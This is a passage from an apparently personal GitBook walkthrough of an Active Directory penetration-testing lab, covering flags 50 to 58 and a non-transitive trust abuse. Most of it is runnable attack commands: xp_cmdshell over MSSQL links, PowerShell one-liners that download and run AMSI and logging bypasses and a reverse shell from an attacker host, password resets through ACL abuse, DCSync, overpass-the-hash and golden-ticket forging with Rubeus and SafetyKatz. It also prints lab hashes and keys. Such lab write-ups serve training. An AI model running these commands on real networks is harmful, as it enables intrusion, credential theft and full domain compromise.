MqOB4jCB36ADAgEAooHXBIHUfYHRMIHOoIHLMIHIMIHFoBswGaADAgEXoRIEEHjJQyXb6ztHIpuC5RNdeO2hChsIRVUuTE9DQUyiGjAYoAMCAQGhETAPGw1BZG1pbmlzdHJhdG9yowcDBQBAoAAApBEYDzIwMjQwNTA2MTUzMzIyWqURGA8yMDI0MDUwNjE1MzMyMlqmERgPMjAyNDA1MDcwMTMzMjJapxEYDzIwMjQwNTEzMTUzMzIyWqgKGwhFVS5MT0NBTKkdMBugAwIBAqEUMBIbBmtyYnRndBsIZXUubG9jYWw=
</strong></code></pre>
{% endtab %}
{% endtabs %}



## Flag 50/51/52 - MSSQL

Use PowerupSQL to enumerate for any database in the domain

```powershell
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
```

<figure><img src="../.gitbook/assets/image (19) (1).png" alt=""><figcaption></figcaption></figure>

So we have non-sysadmin access to us-mssql. Let's enumerate database links for us-mssql:

```powershell
Get-SQLServerLink -Instance us-mssql.us.techcorp.local -Verbose
```

<figure><img src="../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

Use Get-SQLServerLinkCrawl from PowerUpSQL for crawling the database links automatically:

```powershell
Get-SQLServerLinkCrawl -Instance us-mssql -Verbose
```

<figure><img src="../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

If xp\_cmdshell is enabled (or rpcout is true that allows us to enable xp\_cmdshell), it is possible to execute commands on any node in the database links using the below commands.

{% code overflow="wrap" %}
```powershell
Get-SQLServerLinkCrawl -Instance us-mssql -Query 'exec master..xp_cmdshell ''whoami'''
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

Invoke a reverse shell. Host a listener with powercat

```
. .\powercat.ps1
powercat -l -v -p 443 -t 1000
```

{% code overflow="wrap" %}
```
Get-SQLServerLinkCrawl -Instance us-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://192.168.100.64/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://192.168.100.64/amsibypass.txt);iex (iwr -UseBasicParsing http://192.168.100.64/Invoke-PowerShellTcpEx.ps1)"'''
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

Because the link from DB-SQLProd to DB-SQLSrv is configured to use sa. We can enable RPC Out and xp\_cmdshell on DB-SQLSrv! Run the below commands on the reverse shell we got above.

<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell">Invoke-SqlCmd -Query "exec sp_serveroption @server='db-sqlsrv', @optname='rpc', @optvalue='TRUE'"
Invoke-SqlCmd -Query "exec sp_serveroption @server='db-sqlsrv', @optname='rpc out', @optvalue='TRUE'"
Invoke-SqlCmd -Query "EXECUTE ('sp_configure ''show advanced options'',1;reconfigure;') AT ""db-sqlsrv"""
<strong>Invoke-SqlCmd -Query "EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure') AT ""db-sqlsrv"""
</strong></code></pre>

and now launch a reverse shell again on the other server

{% code overflow="wrap" %}
```powershell
Get-SQLServerLinkCrawl -Instance us-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://192.168.100.64/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://192.168.100.64/amsibypass.txt);iex (iwr -UseBasicParsing http://192.168.100.64/Invoke-PowerShellTcpEx.ps1)"''' -QueryTarget db-sqlsrv
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

## Flag 53/54 - FSPs

Load PowerView in the reverse shell to enumerate the trusts

```powershell
iex (New-Object Net.WebClient).DownloadString('http://192.168.100.64/PowerView.ps1')
```

```
Get-ForestTrust
```

<figure><img src="../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

Enumerate interesting ACLs againt this domain

```powershell
Find-InterestingDomainAcl -ResolveGUIDs -Domain dbvendor.local
```

With GenericAll we can try to reset the password of the found user

{% code overflow="wrap" %}
```powershell
Set-DomainUserPassword -Identity db64svc -AccountPassword (ConvertTo-SecureString 'Password@123' -AsPlainText -Force) -Domain dbvendor.local –Verbose
```
{% endcode %}

Now with access to this user try to look for FSPs:

```
Find-ForeignGroup –Verbose
```

<figure><img src="../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```
Get-DomainUser -Domain dbvendor.local | ?{$_.ObjectSid -eq 'S-1-5-21-569087967-1859921580-1949641513-4101'}
```
{% endcode %}

which is the user that we previously pwn, so we are administrator in the domain

## Flag 55 to 58 - PAM trust

Enumerate FSPs on bastion.local to check if there is anything interesting with AD-Module:

{% code overflow="wrap" %}
```powershell
Get-ADObject -Filter {objectClass -eq "foreignSecurityPrincipal"} -Server bastion.local
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>

So, the DA of techcorp.local is a part of a group on bastion.local. To find out which group it is a member of, run the below command:

{% code overflow="wrap" %}
```powershell
Get-ADGroup -Filter * -Properties Member -Server bastion.local | ?{$_.Member -match 'S-1-5-21-2781415573-3701854478-2406986946-500'}
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

Craft a tgt as Domain Admin of techcorp.local to access bastion.local dc

{% code overflow="wrap" %}
```
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args asktgt /domain:techcorp.local /user:administrator /aes256:58db3c598315bf030d4f1f07021d364ba9350444e3f391e167938dd998836883 /dc:techcorp-dc.techcorp.local /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
{% endcode %}

DCSync bastion dc to retrieve his administrator hash

{% code overflow="wrap" %}
```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::dcsync /user:bastion\Administrator" "exit"
```
{% endcode %}

Bastion admin aes: _a32d8d07a45e115fa499cf58a2d98ef5bf49717af58bc4961c94c3c95fc03292_

now craft a tgt

{% code overflow="wrap" %}
```
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args asktgt /domain:bastion.local /user:administrator /aes256:a32d8d07a45e115fa499cf58a2d98ef5bf49717af58bc4961c94c3c95fc03292 /dc:bastion-dc.bastion.local /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
{% endcode %}

Transfer invishell on bastion.local

{% code overflow="wrap" %}
```
echo F | xcopy C:\AD\Tools\InviShell\InShellProf.dll \\bastion-dc.bastion.local\C$\Users\Public\InShellProf.dll /Y
echo F | xcopy C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat \\bastion-dc.bastion.local\C$\Users\Public\RunWithRegistryNonAdmin.bat /Y
```
{% endcode %}

Now access with winrs and launch invishell

Now with AD-Module check if there is any PAM trust:

{% code overflow="wrap" %}
```powershell
Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)}
```
{% endcode %}

<figure><img src="../.gitbook/assets/immagine (39).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
If we try to access production.local from the session on bastion.local using techcorp Administrator we will face the double hop issue, so we need to use Overpass-the-hash Administrator of bastion.local.
{% endhint %}

To enumerate production.local with DA of bastion.local

{% code overflow="wrap" %}
```powershell
Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)} -Server production.local
```
{% endcode %}

<figure><img src="../.gitbook/assets/immagine (40).png" alt=""><figcaption></figcaption></figure>

So we now know that SID History is allowed for access from bastion.local to production.local.

Check the membership of Shadow Security Principals on bastion.local:

{% code overflow="wrap" %}
```powershell
Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl
```
{% endcode %}

<figure><img src="../.gitbook/assets/immagine (41).png" alt=""><figcaption></figcaption></figure>

That is, the Administrator of bastion.local has Enterprise Admin privileges on production.local.

Now, we can access the production.local DC as domain administrator of bastion.local from our current domain us.techcorp.local. Note that production.local has no DNS entry or trust with our current domain us.techcorp.local and we need to use IP address of DC of production.local to access it.

```powershell
Get-DnsServerZone -ZoneName production.local |fl *
```

192.168.102.1

To use PowerShell Remoting to connect to an IP address, we must modify the WSMan Trustedhosts property on the student VM.

```powershell
Set-Item WSMan:\localhost\Client\TrustedHosts * -Force
```

{% hint style="warning" %}
To connect to an ip address you need the NTLM hash and not aes
{% endhint %}

Now craft a tgt with the ntlm of administrator of bastion.local

{% code overflow="wrap" %}
```
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "sekurlsa::opassth /user:administrator /domain:bastion.local /ntlm:f29207796c9e6829aa1882b7cccfa36d /run:powershell.exe" "exit"
```
{% endcode %}

and now enter the session

```powershell
Enter-PSSession 192.168.102.1 -Authentication NegotiateWithImplicitCredential
```

<figure><img src="../.gitbook/assets/immagine (42).png" alt=""><figcaption></figcaption></figure>

## Flag N/A- Abuse non-transitive trust

Using DA access to eu.local, abuse the bidirectional non-transitive trust from eu.local to us.techcorp.local to gain unintended transitive access the forest root - techcorp.local.

Crate a golden ticket as DA of eu.local

{% code overflow="wrap" %}
```
C:\AD\Tools\Rubeus.exe golden /user:Administrator /domain:eu.local /sid:S-1-5-21-3657428294-2017276338-1274645009 /aes256:b3b88f9288b08707eab6d561fefe286c178359bda4d9ed9ea5cb2bd28540075d /nowrap /ptt
```
{% endcode %}

Copy Loader.exe and enable port forwarding to download Rubeus in the memory on eu-dc.

{% code overflow="wrap" %}
```
echo F | xcopy C:\AD\Tools\Loader.exe \\eu-dc.eu.local\C$\Users\Public\Loader.exe /Y
```
{% endcode %}

{% code overflow="wrap" %}
```
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.100.64
```
{% endcode %}

Now using Rubeus in the eu-dc session, we can now request a referral TGT for us.techcorp.local from eu.local leveraging the bidirectional non-transitive trust.

with asktgs

{% code overflow="wrap" %}
```
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args %Pwn% /service:krbtgt/us.techcorp.local /dc:eu-dc.eu.local /nowrap /ticket:previous golden
```
{% endcode %}

Since the trust isn't transitive, we cannot request a referral from eu.local to the forest root - techcorp.local. Instead we can now attempt to create a "local" TGT (service realm is us.techorp.local) and then leverage it to gain a referral TGT from us.techcorp.local to techcorp.local leveraging the child to forest bidirectional trust. Create a "local" TGT in the eu-dc session using the /targetdomain parameter as us.techcorp.local and the above referral TGT in the /ticket parameter.

{% code overflow="wrap" %}
```
C:\Users\Administrator>C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args asktgs /service:krbtgt/us.techcorp.local /dc:us-dc.us.techcorp.local /targetdomain:us.techcorp.local /nowrap /ticket:doIFVjCCBVKg...
```
{% endcode %}

We can now finally request a referral TGT in the eu-dc session for techcorp.local from us.techcorp.local abusing the child to forest bidirectional trust. Note to use the above "local" TGT in the following /ticket parameter.

{% code overflow="wrap" %}
```
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args %Pwn% /service:krbtgt/techcorp.local /dc:us-dc.us.techcorp.local /targetdomain:us.techcorp.local /nowrap /ticket:doIFaDCCB...
```
{% endcode %}

Finally, request a usable TGS in the eu-dc session to gain access onto any target service (CIFS in this case) on techcorp.local. Use the above child to forest referral TGT in the /ticket parameter.

{% code overflow="wrap" %}
```
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args %Pwn% /service:CIFS/techcorp-dc.techcorp.local /dc:techcorp-dc.techcorp.local /nowrap /ptt /ticket:doIFczCCBW...
```
{% endcode %}
